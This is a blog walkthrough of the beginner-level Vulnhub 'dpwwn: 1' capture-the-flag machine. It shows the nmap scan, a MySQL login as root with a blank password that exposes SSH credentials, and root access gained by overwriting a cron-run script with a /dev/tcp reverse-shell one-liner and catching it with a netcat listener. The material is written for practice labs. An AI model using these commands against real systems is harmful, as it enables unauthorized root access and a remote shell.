---
title: 'cronjob privileged escalation dpwwn: 1 Vulnhub Walkthrough 1'
date: 2019-10-22T20:23:00+01:00
draft: false
---

  

  
  
  
  
  

[cronjob privileged escalation dpwwn: 1 Vulnhub Walkthrough](https://leetvilu.blogspot.com/2019/10/cronjob-privileged-escalation-dpwwn-1.html)
==============================================================================================================================================

Today we are going to take another CTF challenge down. The credit for making this VM machine goes to “Debashish Pal” and it is a boot2root challenge where we have to root the machine and capture the flag to complete the challenge. You can download this VM [**here**](https://www.vulnhub.com/entry/dpwwn-1,342/).  
**Security Level**: Beginner  

### **Penetrating Methodology:**

1.  **Scanning**

*   Netdiscover
*   Nmap

2.  **Enumeration**

*   Mysql 

3.  **Exploitation**

*   SSH
*   Msfvenom
*   Netcat

4.  **Privilege Escalation**

*   Writable Script running on crontab

### Walkthrough:

**Scanning:**  
Let’s start of by scanning the network and identifying the host IP address. We can see our host IP is 192.168.1.101 by using Netdiscover.  

netdiscover

1

netdiscover

**![](https://i1.wp.com/1.bp.blogspot.com/--qQ1IdrGGaY/XVUrTHk2DbI/AAAAAAAAgBs/ayJbaxeULpk-udsMmJ1lrzJDT6rRJHC8wCLcBGAs/s1600/1.png?w=687&ssl=1)**  
Then, as usual, we used our favourite tool Nmap for port enumeration. We found that port 22, 80 and 3306 are open.  

nmap -A 192.168.1.101

1

nmap \-A  192.168.1.101

**![](https://i0.wp.com/1.bp.blogspot.com/-dqVIZT8FP10/XVUrTPuWaFI/AAAAAAAAgBo/HmFhAOqBxUA9ifjtuR5UXOJyQ3JZxHTMQCLcBGAs/s1600/2.1.png?w=687&ssl=1)**  

### **Enumeration:**

As we can see mysql service is running (3306) we tried our luck to access the mysql server with root user and blank password and to our surprise, we were able to login.  
Once we logged in, we got the database names, there we saw a database of ssh, we checked for its tables and found one user credentials **mistic:testP@$$swordmistic**  

mysql –h 192.168.1.101 –u root –p show databases; use ssh; show tables; select \* from users;

1

2

3

4

5

mysql  –h  192.168.1.101  –u  root  –p

show databases;

use  ssh;

show tables;

select \*  from users;

![](https://i0.wp.com/1.bp.blogspot.com/-d7B1msTuXTo/XVUrTSfWpBI/AAAAAAAAgBw/FpOGJLBkQWQF8B5Z92pScsYPKD9n7_lVQCLcBGAs/s1600/2.png?w=687&ssl=1)  

### **Exploitation:**

We were able to ssh the target system using the above-found credentials. After logging in we found a file named **logrot.sh**. We looked inside the file and this is bash script which collects the logs.  
And in the crontab, the same file is scheduled for execution with root privileges.  

ssh mistic@192.168.1.101 ls –la cat logrot.sh cat /etc/crontab

1

2

3

4

ssh mistic@192.168.1.101

ls  –la

cat logrot.sh

cat  /etc/crontab

![](https://i0.wp.com/1.bp.blogspot.com/-QjebkcFMwto/XVUrUrlkXHI/AAAAAAAAgB0/tLqmLkomA8kZYvGx76tk4GgoT5fNYdWAACLcBGAs/s1600/3.png?w=687&ssl=1)  
So what we did is we created a reverse netcat payload using msfvenom with listener ip as our kali and listener port 1234.  

msfvenom –p cmd/unix/reverse\_bash lhost=192.168.1.106 lport=1234 R

1

msfvenom  –p  cmd/unix/reverse\_bash lhost\=192.168.1.106  lport\=1234  R

**![](https://i0.wp.com/1.bp.blogspot.com/-SH-ZSJyqEfA/XVUrUs4YwhI/AAAAAAAAgB4/LDkdWJUQq4M4Lnq4u6E-jBgNLP9lyFvJwCLcBGAs/s1600/4.png?w=687&ssl=1)**  
Then we copied the same payload inside the **logrot.sh** binary using the **echo** command.  

echo ‘0<&74-;exec 74<>/dev/tcp/192.168.1.106/1234;sh <&74 >&74 2>&74’ > logrot.sh

1

echo  ‘0<&74\-;exec  74<>/dev/tcp/192.168.1.106/1234;sh  <&74  \>&74  2\>&74’  \>  logrot.sh

**![](https://i0.wp.com/1.bp.blogspot.com/-UygL3kE4-xQ/XVUrU7bjljI/AAAAAAAAgB8/thBAwJeWzRQhDLo1byQBxcZqdKhfkbp1QCLcBGAs/s1600/5.png?w=687&ssl=1)**  

### **Privilege Escalation:**

Since the **logrot.sh** is scheduled in crontab with root privileges, we simultaneously started netcat listener on our kali machine and waited for the reverse shell. And after some time we got a **root** shell and eventually the root **flag.**  

nc –lvp 1234 cd /root ls cat dpwwn-01—FLAG.txt

1

2

3

4

nc  –lvp  1234

cd  /root

ls

cat dpwwn\-01—FLAG.txt

![](https://i2.wp.com/1.bp.blogspot.com/-3ThQdQuxpzQ/XVUrV4GD0UI/AAAAAAAAgCA/Qys1sBpGRfoX2DMbtkZtyr_6sG3z0srxwCLcBGAs/s1600/6.png?w=687&ssl=1)